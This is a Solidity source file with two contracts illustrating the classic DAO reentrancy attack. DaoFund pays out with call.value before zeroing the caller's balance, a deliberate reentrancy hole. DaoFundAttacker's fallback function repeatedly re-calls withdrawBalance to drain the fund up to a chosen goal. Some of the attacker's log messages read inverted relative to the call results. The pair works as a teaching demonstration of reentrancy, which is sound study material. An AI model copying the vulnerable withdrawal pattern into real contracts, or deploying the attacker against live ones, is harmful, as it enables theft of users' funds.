pragma solidity ^0.4.18;

contract DaoFund{

   mapping(address=>uint) userBalances;

   event WithdrawBalance(string message,uint gas);

   function getUserBalance(address user) external view returns(uint) {
     return userBalances[user];
   }

   function addToBalance() external payable {
     userBalances[msg.sender] = userBalances[msg.sender] + msg.value;
   }

   function withdrawBalance() external {
     uint amountToWithdraw = userBalances[msg.sender];
    WithdrawBalance("withdrawBalance",msg.gas);
     if (msg.sender.call.value(amountToWithdraw)() == false) {
         revert();
     }
     userBalances[msg.sender] = 0;
   }
}

contract DaoFundAttacker{
   address fundAddress;
   uint goalAmount;
   
   event WithdrawBalance(string message,uint gas);

   function  DaoFundAttacker(address _fundAddress) public {
       fundAddress=_fundAddress;
   }

   function() public payable {

       if( goalAmount > msg.value)
       {
            goalAmount -= msg.value;
           if(fundAddress.call(bytes4(keccak256("withdrawBalance()")))) {
               WithdrawBalance("Failed in fallback",msg.gas);
           }
           else WithdrawBalance("Succeeded in fallback",msg.gas);
       }
       else {
           WithdrawBalance("Is_Attack is false in fallback",msg.gas);
       }
   }

   function  deposit() public payable {
        if(fundAddress.call.value(msg.value).gas(20764)(bytes4(keccak256("addToBalance()"))) ==false) {
               revert();
        }
   }

   function  withdraw(uint _goalAmount) public {
       goalAmount = _goalAmount * 1 ether;
       
        if(fundAddress.call(bytes4(keccak256("withdrawBalance()")))==false ) {
               WithdrawBalance("Failed in withdraw",msg.gas);
               revert();
        }
        else WithdrawBalance("Succeeded in withdraw",msg.gas);
   }
}
